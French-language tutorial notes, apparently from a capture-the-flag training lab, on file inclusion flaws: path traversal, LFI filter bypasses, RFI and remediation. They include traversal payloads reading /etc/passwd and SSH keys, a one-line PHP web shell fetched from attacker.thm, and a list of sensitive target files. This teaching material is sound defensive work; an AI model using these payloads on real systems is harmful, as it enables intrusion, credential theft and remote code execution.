# File Inclusion

## 🔍 **1. Pourquoi les vulnérabilités d’inclusion de fichiers se produisent-elles ?**

### 🧠 **Racine du problème : absence de validation/sanitisation des entrées utilisateur**
Les applications web dynamiques ont souvent besoin de charger différents fichiers en fonction des actions de l’utilisateur (ex. : changement de langue, chargement de contenu, etc.).  
Lorsqu’un développeur utilise **des fonctions sensibles** (comme `include()`, `require()`, `file_get_contents()` en PHP) **sans valider ou filtrer l’entrée fournie par l’utilisateur**, il crée une porte ouverte à l’attaque.

> 💡 **Exemple concret (PHP)** :
```php
<?php
include($_GET['page'] . '.php');
?>
```
Ici, si l’URL est `?page=accueil`, le serveur charge `accueil.php`.  
Mais si l’attaquant envoie `?page=../../../../etc/passwd`, le serveur tente de charger `/etc/passwd` — un fichier système critique.

### ⚠️ Ce n’est **pas la fonction** qui est vulnérable, mais **la manière dont elle est utilisée**.
La fonction `include()` est légitime. Le problème vient de **l’absence de contrôle sur ce que l’utilisateur peut injecter**.

---

## 🌪️ **2. Quels sont les risques ?**

### 📉 **Conséquences immédiates :**
- **Fuite de données sensibles** : mots de passe (`/etc/shadow`), clés SSH (`/root/.ssh/id_rsa`), historiques (`~/.bash_history`), logs applicatifs.
- **Accès au code source** : révélation de logique métier, secrets codés en dur, tokens API.
- **Reconnaissance du système** : version du noyau (`/proc/version`), configuration réseau, services actifs.

### 💥 **Conséquences avancées :**
- **Exécution de commandes à distance (RCE)** : si l’attaquant peut écrire un fichier (via upload, log poisoning, etc.) **et** l’inclure via LFI → exécution arbitraire de code.
- **Escalade de privilèges** : accès à des fichiers appartenant à `root` ou à des services critiques.
- **Persistance** : création de backdoors via inclusion de fichiers malveillants.

---

## 🗺️ **3. Path Traversal (ou Directory Traversal)**

### 📌 Définition :
Technique permettant de **sortir du répertoire racine de l’application** pour accéder à des fichiers système via des séquences comme `../`.

### 🧩 Mécanisme :
- Chaque `../` remonte d’un niveau dans l’arborescence.
- Exemple :  
  - Application dans `/var/www/app/`  
  - URL : `http://webapp.thm/get.php?file=../../../../etc/passwd`  
  - Résolution :  
    ```
    /var/www/app/ + ../../../../etc/passwd → /etc/passwd
    ```

### 🖥️ Sur Windows :
Mêmes principes, mais chemins différents :
- `C:\Windows\win.ini`
- `C:\boot.ini` (anciennes versions)
- Payload : `?file=../../../../windows/win.ini`

> ✅ **Astuce** : même sans extension `.php`, si la fonction lit le contenu brut (ex. `file_get_contents`), le fichier est affiché tel quel.

---

## 📁 **4. Local File Inclusion (LFI)**

### 🎯 Objectif :
Inclure **un fichier local** sur le serveur via une faille dans une fonction d’inclusion dynamique.

### 🧪 Scénarios d’exploitation :

#### 🔹 **Cas 1 : Inclusion directe sans chemin fixe**
```php
include($_GET['lang']);
```
→ Attaque : `?lang=/etc/passwd`  
→ Fonctionne car aucun préfixe ni suffixe.

#### 🔹 **Cas 2 : Chemin fixe ajouté**
```php
include("languages/" . $_GET['lang']);
```
→ Attaque : `?lang=../../../../etc/passwd`  
→ Le chemin devient : `languages/../../../../etc/passwd` → `/etc/passwd`

#### 🔹 **Cas 3 : Erreur divulguant la structure (Black Box)**
Erreur :  
```
Warning: include(languages/THM.php): failed to open stream...
```
→ On sait que :
- Le fichier est cherché dans `languages/`
- L’extension `.php` est ajoutée automatiquement

→ Problème : `?lang=../../../../etc/passwd` → devient `languages/../../../../etc/passwd.php` → **échec** (car `/etc/passwd.php` n’existe pas)

##### 🔸 **Contournement : Null Byte Injection (`%00`)**
- Payload : `?lang=../../../../etc/passwd%00`
- Résultat : `include("languages/../../../../etc/passwd%00.php")` → interprété comme `include("languages/../../../../etc/passwd")`
- ⚠️ **Obsolète depuis PHP 5.3.4** (corrigé).

#### 🔹 **Cas 4 : Contournement de filtres simples**
Si le développeur filtre `../` :
```php
$input = str_replace('../', '', $_GET['lang']);
```
→ Attaque : `....//`  
- Pourquoi ?  
  - `....//` → après suppression de `../` → `../` reste !  
  - Exemple : `....//....//etc/passwd` → devient `../../etc/passwd`

#### 🔹 **Cas 5 : Utilisation de `/.` (current directory trick)**
- `/etc/passwd/.` → résout toujours vers `/etc/passwd`
- Utile si le filtre bloque exactement `/etc/passwd` mais pas `/etc/passwd/.`

#### 🔹 **Cas 6 : Chemin imposé dans l’URL**
URL : `?lang=languages/EN.php`  
→ Attaque : `?lang=languages/../../../../etc/passwd`

---

## 🌐 **5. Remote File Inclusion (RFI)**

### 📌 Condition requise :
- `allow_url_fopen = On` **ET** `allow_url_include = On` dans `php.ini` (désactivé par défaut depuis PHP 5.2.0).

### 🎯 Objectif :
Forcer le serveur à **inclure un fichier distant** contrôlé par l’attaquant.

### 🧪 Exploitation :
1. Attaquant héberge un fichier malveillant :  
   `http://attacker.thm/shell.txt` contenant :
   ```php
   <?php system($_GET['cmd']); ?>
   ```
2. Envoie la requête :  
   `http://victim.com/index.php?lang=http://attacker.thm/shell.txt`
3. Le serveur victime télécharge et exécute le fichier → RCE !

### 💣 Conséquences :
- **Exécution de commandes arbitraires**
- **Installation de backdoors**
- **Pivot vers d’autres systèmes internes**

---

## 🛡️ **6. Remédiation – Bonnes pratiques pour les développeurs**

### ✅ **Principes fondamentaux :**
> **NE JAMAIS FAIRE CONFIANCE À L’ENTRÉE UTILISATEUR.**

### 🔒 **Mesures techniques :**

| Mesure | Description |
|-------|-------------|
| **Whitelist stricte** | Autoriser uniquement des valeurs connues :<br>`if ($lang === 'en' || $lang === 'fr') include("lang/$lang.php");` |
| **Désactiver les fonctions dangereuses** | Désactiver `allow_url_include` (toujours). |
| **Utiliser des chemins absolus sécurisés** | Ne jamais concaténer directement l’entrée utilisateur. |
| **Supprimer les erreurs PHP en production** | Éviter la fuite de chemins (`display_errors = Off`). |
| **WAF (Web Application Firewall)** | Bloquer les motifs comme `../`, `http://`, etc. |
| **Mettre à jour les frameworks** | Corriger les vulnérabilités connues. |

### 🧼 **Sanitisation (moins fiable que la whitelist) :**
- Supprimer les caractères spéciaux (`..`, `/`, `\`, `:`)
- Normaliser le chemin avec `realpath()` et vérifier qu’il reste dans le dossier autorisé.

> ❌ **Ne jamais compter uniquement sur le filtrage** : les contournements existent (double encodage, null byte, etc.).

---

## 🧰 **7. Fichiers sensibles à tester **

### 🐧 Linux :
| Fichier | Intérêt |
|--------|--------|
| `/etc/passwd` | Liste des utilisateurs |
| `/etc/shadow` | Hachages de mots de passe (accès root requis) |
| `/proc/version` | Version du noyau |
| `/var/log/apache2/access.log` | Log poisoning → RCE |
| `/root/.ssh/id_rsa` | Clé privée SSH |
| `/etc/issue` | Info système avant login |

### 🪟 Windows :
| Fichier | Intérêt |
|--------|--------|
| `C:\Windows\win.ini` | Fichier de config classique |
| `C:\boot.ini` | Options de démarrage (XP/2003) |
| `C:\Windows\System32\drivers\etc\hosts` | Résolution DNS locale |

---

